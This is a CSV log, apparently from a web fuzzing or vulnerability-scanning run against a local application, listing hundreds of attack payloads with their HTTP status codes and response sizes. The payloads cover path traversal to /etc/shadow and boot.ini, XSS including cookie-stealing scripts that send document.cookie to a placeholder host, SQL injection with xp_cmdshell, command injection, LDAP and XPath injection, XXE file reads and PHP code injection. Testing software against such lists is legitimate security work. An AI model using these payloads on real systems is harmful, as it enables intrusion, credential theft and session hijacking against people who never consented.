id,response,lines,word,chars,request,success
101,200,117,218,3435,%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
107,400,11,136,2166,\\&apos;/bin/cat%20/etc/shadow\\&apos;,1
103,200,117,218,3435,%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00,1
109,400,11,136,2186,/../../../../../../../../bin/id|,1
111,400,11,136,2100,C:\inetpub\wwwroot\global.asa,1
104,200,117,218,3435,%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini,1
110,200,117,218,3435,C:/inetpub/wwwroot/global.asa,1
125,400,11,136,2118,..\..\..\..\..\..\..\..\..\..\boot.ini,1
112,200,117,218,3435,C:/boot.ini,1
123,400,11,136,2120,\..\..\..\..\..\..\..\..\..\..\boot.ini,1
108,200,117,218,3435,../../../../../../../../conf/server.xml,1
124,400,11,136,2124,..\..\..\..\..\..\..\..\..\..\boot.ini%00,1
114,200,117,218,3435,../../../../../../../../../../../../localstart.asp%00,1
105,200,117,218,3435,/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,1
120,200,117,218,3435,/../../../../../../../../../../../boot.ini,1
121,400,11,136,2188,/..\../..\../..\../..\../..\../..\../boot.ini,1
122,400,11,136,2176,/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,1
116,200,117,218,3435,../../../../../../../../../../../../boot.ini%00,1
126,200,117,218,3435,/../../../../../../../../../../../boot.ini%00.html,1
127,200,117,218,3435,/../../../../../../../../../../../boot.ini%00.jpg,1
119,200,117,218,3435,/../../../../../../../../../../../boot.ini%00,1
118,200,117,218,3435,/./././././././././././boot.ini,1
115,200,117,218,3435,../../../../../../../../../../../../localstart.asp,1
140,400,11,136,2044,},1
117,200,117,218,3435,../../../../../../../../../../../../boot.ini,1
128,200,117,218,3435,/.../.../.../.../.../,1
130,200,117,218,3435,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
134,200,117,218,3435,"/,%ENV,/",1
141,200,117,218,3435,;,1
142,200,117,218,3435,/,1
139,200,117,218,3435,*,1
145,400,11,136,2056,\\/,1
137,200,117,218,3435,%,1
143,400,11,136,2044,\,1
138,200,117,218,3435,#,1
157,400,11,136,2044,`,1
136,200,117,218,3435,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,1
161,400,11,136,2054,^',1
160,400,11,136,2046,*|,1
131,200,117,218,3435,%0d%0aX-Injection-Header:%20AttackValue,1
133,200,117,218,3435,%01%02%03%04%0a%0d%0aADSF,1
135,200,117,218,3435,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,1
132,200,117,218,3435,!@#0%^#0##018387@#0^^**((),1
129,200,117,218,3435,..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
149,200,117,218,3435,&lt;,1
156,400,11,136,2046,||,1
155,400,11,136,2044,|,1
159,200,117,218,3435,--,1
158,200,117,218,3435,-,1
152,400,11,136,2050,<,1
153,400,11,136,2058,<<,1
154,400,11,136,2066,<<<,1
147,400,11,136,2056,\\\\?\\,1
144,400,11,136,2046,\\,1
146,400,11,136,2052,\\\\*,1
162,400,11,136,2054,\',1
148,200,117,218,3435,&lt,1
150,200,117,218,3435,&LT,1
174,400,11,136,2070,"""\t""",1
173,400,11,136,2046,\t,1
151,200,117,218,3435,&LT;,1
164,200,117,218,3435,@',1
168,200,117,218,3435,*',1
171,200,117,218,3435,!@#$%%^#$%#$@#$%$$@#$%^^**((),1
167,400,11,136,2056,['],1
175,200,117,218,3435,&#10;,1
172,200,117,218,3435,%01%02%03%04%0a%0d%0aADSF,1
166,400,11,136,2056,{'},1
170,200,117,218,3435,!',1
169,200,117,218,3435,#',1
163,200,117,218,3435,/',1
165,200,117,218,3435,('),1
176,200,117,218,3435,&#13;,1
178,200,117,218,3435,&#13;&#10;,1
182,200,117,218,3435,#xA#xD,1
188,200,117,218,3435,%3C%3F,1
186,400,11,136,2052,<?,1
187,200,117,218,3435,%3C,1
185,200,117,218,3435,%00,1
184,200,117,218,3435,%00/,1
181,200,117,218,3435,#xD#xA,1
183,200,117,218,3435,/%00/,1
180,200,117,218,3435,#xA,1
177,200,117,218,3435,&#10;&#13;,1
191,200,117,218,3435,%5C/,1
179,200,117,218,3435,#xD,1
189,200,117,218,3435,%60,1
195,200,117,218,3435,%2A,1
201,200,117,218,3435,../,1
198,400,11,136,2050,%20|,1
200,200,117,218,3435,%2500,1
199,200,117,218,3435,%250a,1
197,200,117,218,3435,%20,1
194,200,117,218,3435,/%2A,1
196,200,117,218,3435,%2C,1
190,200,117,218,3435,%5C,1
192,200,117,218,3435,%7C,1
202,200,117,218,3435,%2e%2e%2f,1
193,200,117,218,3435,%00,1
204,200,117,218,3435,..%c0%af,1
208,200,117,218,3435,..%%35c,1
206,400,11,136,2048,..\,1
210,200,117,218,3435,..%%35%63,1
207,200,117,218,3435,..%5c,1
209,200,117,218,3435,..%255c,1
203,200,117,218,3435,..%u2215,1
205,200,117,218,3435,..%bg%qf,1
211,200,117,218,3435,..%25%35%63,1
213,200,117,218,3435,&#60,1
217,200,117,218,3435,&#000060,1
224,200,117,218,3435,&#0000060;,1
223,200,117,218,3435,&#000060;,1
222,200,117,218,3435,&#00060;,1
221,200,117,218,3435,&#0060;,1
220,200,117,218,3435,&#060;,1
216,200,117,218,3435,&#00060,1
219,200,117,218,3435,&#60;,1
218,200,117,218,3435,&#0000060,1
215,200,117,218,3435,&#0060,1
212,200,117,218,3435,..%u2216,1
214,200,117,218,3435,&#060,1
225,200,117,218,3435,&#x3c,1
227,200,117,218,3435,&#x003c,1
231,200,117,218,3435,&#x3c;,1
236,200,117,218,3435,&#x000003c;,1
235,200,117,218,3435,&#x00003c;,1
230,200,117,218,3435,&#x000003c,1
232,200,117,218,3435,&#x03c;,1
226,200,117,218,3435,&#x03c,1
234,200,117,218,3435,&#x0003c;,1
233,200,117,218,3435,&#x003c;,1
229,200,117,218,3435,&#x00003c,1
228,200,117,218,3435,&#x0003c,1
239,200,117,218,3435,&#X003c,1
237,200,117,218,3435,&#X3c,1
243,200,117,218,3435,&#X3c;,1
247,200,117,218,3435,&#X00003c;,1
246,200,117,218,3435,&#X0003c;,1
245,200,117,218,3435,&#X003c;,1
242,200,117,218,3435,&#X000003c,1
244,200,117,218,3435,&#X03c;,1
241,200,117,218,3435,&#X00003c,1
238,200,117,218,3435,&#X03c,1
240,200,117,218,3435,&#X0003c,1
248,200,117,218,3435,&#X000003c;,1
250,200,117,218,3435,&#x03C,1
254,200,117,218,3435,&#x000003C,1
262,200,117,218,3435,&#X03C,1
264,200,117,218,3435,&#X0003C,1
261,200,117,218,3435,&#X3C,1
263,200,117,218,3435,&#X003C,1
260,200,117,218,3435,&#x000003C;,1
259,200,117,218,3435,&#x00003C;,1
258,200,117,218,3435,&#x0003C;,1
257,200,117,218,3435,&#x003C;,1
252,200,117,218,3435,&#x0003C,1
255,200,117,218,3435,&#x3C;,1
253,200,117,218,3435,&#x00003C,1
256,200,117,218,3435,&#x03C;,1
289,400,11,136,2152,"<script>alert(""XSS"")</script>",1
288,400,11,136,2102,"""><script>""",1
287,400,11,136,2092,""">xxx<P>yyy",1
249,200,117,218,3435,&#x3C,1
251,200,117,218,3435,&#x003C,1
265,200,117,218,3435,&#X00003C,1
271,200,117,218,3435,&#X00003C;,1
279,200,117,218,3435,/&apos;,1
286,200,117,218,3435,#&apos;,1
267,200,117,218,3435,&#X3C;,1
284,400,11,136,2066,[&apos;],1
283,400,11,136,2066,{&apos;},1
281,400,11,136,2064,^&apos;,1
280,400,11,136,2064,\&apos;,1
276,400,11,136,2054,\u003C,1
285,200,117,218,3435,*&apos;,1
282,200,117,218,3435,@&apos;,1
278,200,117,218,3435,&apos;,1
275,400,11,136,2054,\u003c,1
274,400,11,136,2050,\x3C,1
273,400,11,136,2050,\x3c,1
277,200,117,218,3435,something%00html,1
290,400,11,136,2190,"<<script>alert(""XSS"");//<</script>",1
292,400,11,136,2170,'><script>alert(document.cookie)</script>,1
304,400,11,136,2140,<IMG SRC=javascript:alert('XSS')>,1
270,200,117,218,3435,&#X0003C;,1
272,200,117,218,3435,&#X000003C;,1
303,400,11,136,2156,"<IMG SRC=""javascript:alert('XSS')""",1
268,200,117,218,3435,&#X03C;,1
266,200,117,218,3435,&#X000003C,1
269,200,117,218,3435,&#X003C;,1
296,200,117,218,3435,%3cscript%3ealert(document.cookie);%3c%2fscript%3e,1
305,400,11,136,2140,<IMG SRC=JaVaScRiPt:alert('XSS')>,1
302,400,11,136,2166,"<IMG SRC=""javascript:alert('XSS');"">",1
301,400,11,136,2164,<IMG%20SRC='javascript:alert(document.cookie)'>,1
300,400,11,136,2216,<xss><script>alert('XSS')</script></vulnerable>,1
298,400,11,136,2166,&ltscript&gtalert(document.cookie);</script>,1
295,400,11,136,2146,"%3cscript%3ealert(""XSS"");%3c/script%3e",1
294,400,11,136,2120,"\"";alert('XSS');//",1
291,400,11,136,2152,<script>alert(document.cookie)</script>,1
293,400,11,136,2172,'><script>alert(document.cookie);</script>,1
306,400,11,136,2160,<IMG SRC=javascript:alert(&quot;XSS&quot;)>,1
308,400,11,136,2236,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
299,200,117,218,3435,&ltscript&gtalert(document.cookie);&ltscript&gtalert,1
312,400,11,136,2088,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1
316,400,11,136,2170,"<IMG DYNSRC=""javascript:alert('XSS')"">",1
297,200,117,218,3435,%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E,1
315,400,11,136,2088,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1
314,400,11,136,2088,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1
311,400,11,136,2166,"<IMG SRC=""jav	ascript:alert('XSS');"">",1
313,400,11,136,2088,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1
307,400,11,136,2168,"<IMG SRC=`javascript:alert(""'XSS'"")`>",1
310,400,11,136,2164,<IMG%20SRC='javasc	ript:alert(document.cookie)'>,1
309,400,11,136,2172,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",1
317,400,11,136,2170,"<IMG LOWSRC=""javascript:alert('XSS')"">",1
319,400,11,136,2070,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
323,400,11,136,2328,"""><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>",1
329,400,11,136,2054,"""",1
328,200,117,218,3435,',1
327,200,117,218,3435,http://localhost:8080/owners/find?lastName=,1
326,400,11,136,2124,"'';!--""<XSS>=&{()}",1
325,400,11,136,2672,"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",1
321,400,11,136,2070,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
318,400,11,136,2242,<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>,1
320,400,11,136,2070,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
322,200,117,218,3435,'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E,1
324,200,117,218,3435,%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E,1
330,200,117,218,3435,#,1
343,400,11,136,2092,\x27\x4F\x52 SELECT *,1
344,400,11,136,2092,\x27\x6F\x72 SELECT *,1
342,400,11,136,2064,\x3D \x27,1
341,400,11,136,2074,\x3D \x3B',1
332,200,117,218,3435,--,1
336,200,117,218,3435,= ',1
340,400,11,136,2050,\x27,1
339,400,11,136,2050,\x23,1
347,400,11,136,2100,"<>""'%;)(&+",1
357,400,11,136,2082,""" or 0=0 #",1
335,200,117,218,3435,' ;,1
337,200,117,218,3435,= ;,1
338,200,117,218,3435,= --,1
333,200,117,218,3435,' --,1
345,200,117,218,3435,'or select *,1
351,200,117,218,3435,') or ('x'='x,1
355,200,117,218,3435,or 0=0 --,1
331,200,117,218,3435,-,1
356,200,117,218,3435,' or 0=0 #,1
354,400,11,136,2086,""" or 0=0 --",1
334,200,117,218,3435,--';,1
350,400,11,136,2112,""" or ""x""=""x",1
353,200,117,218,3435,' or 0=0 --,1
360,400,11,136,2080,""" or 1=1--",1
352,200,117,218,3435,0 or 1=1,1
349,200,117,218,3435,' or 'x'='x,1
346,200,117,218,3435,admin'--,1
348,200,117,218,3435,' or ''=',1
372,400,11,136,2116,"hi"" or ""a""=""a",1
358,200,117,218,3435,or 0=0 #,1
364,200,117,218,3435,or%201=1,1
371,400,11,136,2116,""") or (""a""=""a",1
373,400,11,136,2090,"hi"" or 1=1 --",1
374,200,117,218,3435,hi' or 1=1 --,1
369,400,11,136,2112,""" or ""a""=""a",1
367,400,11,136,2130,""" or 1=1 or """"=""",1
362,400,11,136,2114,"""' or 1 --'""",1
370,200,117,218,3435,') or ('a'='a,1
377,400,11,136,2120,"hi"") or (""a""=""a",1
368,200,117,218,3435,' or a=a--,1
366,200,117,218,3435,' or 1=1 or ''=',1
363,200,117,218,3435,or 1=1--,1
365,200,117,218,3435,or%201=1 --,1
388,200,117,218,3435,limit,1
359,200,117,218,3435,' or 1=1--,1
381,200,117,218,3435,PRINT,1
375,200,117,218,3435,hi' or 'a'='a,1
390,200,117,218,3435,asc,1
361,200,117,218,3435,' or '1'='1'--,1
389,200,117,218,3435,order by,1
387,200,117,218,3435,procedure,1
386,200,117,218,3435,or,1
385,200,117,218,3435,as,1
383,200,117,218,3435,select,1
382,200,117,218,3435,PRINT @@variable,1
384,200,117,218,3435,insert,1
391,200,117,218,3435,desc,1
376,200,117,218,3435,hi') or ('a'='a,1
380,200,117,218,3435,",@variable",1
379,200,117,218,3435,@variable,1
378,200,117,218,3435,'hi' or 'x'='x';,1
393,200,117,218,3435,update,1
407,200,117,218,3435,exec sp,1
397,200,117,218,3435,replace,1
405,200,117,218,3435,' or user like '%,1
406,200,117,218,3435,exec xp,1
402,200,117,218,3435,' or uname like '%,1
404,200,117,218,3435,' or uid like '%,1
403,200,117,218,3435,' or userid like '%,1
401,200,117,218,3435,' or username like '%,1
400,200,117,218,3435,bfilename,1
399,200,117,218,3435,handler,1
396,200,117,218,3435,truncate,1
395,200,117,218,3435,having,1
398,200,117,218,3435,like,1
392,200,117,218,3435,delete,1
410,200,117,218,3435,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
394,200,117,218,3435,distinct,1
408,200,117,218,3435,'; exec master..xp_cmdshell,1
414,200,117,218,3435,' UNION ALL SELECT,1
422,200,117,218,3435,'%20or%201=1,1
420,200,117,218,3435,tz_offset,1
424,200,117,218,3435,%20$(sleep%2050),1
421,200,117,218,3435,&lt;&gt;&quot;'%;)(&amp;+,1
417,400,11,136,2088,'||UTL_HTTP.REQUEST,1
419,200,117,218,3435,to_timestamp_tz,1
425,200,117,218,3435,%20'sleep%2050',1
423,200,117,218,3435,%27%20or%201=1,1
412,400,11,136,2078,\x27UNION SELECT,1
418,200,117,218,3435,1;SELECT%20*,1
416,200,117,218,3435,' (select top 1,1
432,400,11,136,2046,*|,1
415,200,117,218,3435,' or (EXISTS),1
413,200,117,218,3435,' UNION SELECT,1
409,200,117,218,3435,'; exec xp_regread,1
428,200,117,218,3435,'sqlattempt1,1
426,200,117,218,3435,char%4039%41%2b%40SELECT,1
411,200,117,218,3435,--sp_password,1
440,200,117,218,3435,),1
439,200,117,218,3435,%28,1
436,400,11,136,2080,*(|(objectclass=*)),1
441,200,117,218,3435,%29,1
434,400,11,136,2066,*(|(mail=*)),1
438,200,117,218,3435,(,1
437,200,117,218,3435,%2A%28%7C%28objectclass%3D%2A%29%29,1
435,200,117,218,3435,%2A%28%7C%28mail%3D%2A%29%29,1
430,400,11,136,2044,|,1
431,200,117,218,3435,%7C,1
456,400,11,136,2192,"<name>','')); phpinfo(); exit;/*</name>",1
433,200,117,218,3435,%2A%7C,1
442,200,117,218,3435,&,1
427,200,117,218,3435,&apos;%20OR,1
429,200,117,218,3435,(sqlattempt2),1
444,200,117,218,3435,!,1
448,200,117,218,3435,x' or 1=1 or 'x'='y,1
455,200,117,218,3435,x' or name()='username' or 'x'='y,1
454,200,117,218,3435,count(/child::node()),1
453,200,117,218,3435,@*,1
452,200,117,218,3435,*/*,1
457,400,11,136,2198,<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,1
451,200,117,218,3435,//*,1
450,200,117,218,3435,//,1
447,200,117,218,3435,' or ''=',1
449,200,117,218,3435,/,1
468,400,11,136,2424,"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",1
459,400,11,136,2494,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",1
446,200,117,218,3435,' or 1=1 or ''=',1
443,200,117,218,3435,%26,1
463,400,11,136,2538,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>",1
445,200,117,218,3435,%21,1
467,400,11,136,2208,"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
466,400,11,136,2450,"<xml ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
465,400,11,136,2310,"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>",1
462,400,11,136,2538,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>",1
464,400,11,136,2538,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>",1
461,400,11,136,2520,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>",1
458,400,11,136,2294,<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,1
460,400,11,136,2358,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>",1
